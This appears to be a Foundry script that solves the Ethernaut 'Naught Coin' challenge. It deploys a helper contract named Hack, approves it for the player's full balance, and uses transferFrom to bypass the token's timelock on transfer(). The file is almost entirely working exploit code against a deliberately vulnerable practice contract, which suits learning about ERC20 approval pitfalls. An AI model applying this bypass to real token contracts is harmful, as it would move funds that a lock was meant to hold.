// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinSolution is Script {
    address naughtCoin = 0x559f73Bbd71BFeEA385F295a234F3773FA372Ba5;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hack hack = new Hack();
        IERC20(naughtCoin).approve(address(hack), type(uint256).max);
        hack.transfer(IERC20(naughtCoin), vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}

contract Hack {
    function transfer(IERC20 target, address player) external {
        target.transferFrom(player, address(this), target.balanceOf(player));
    }
}
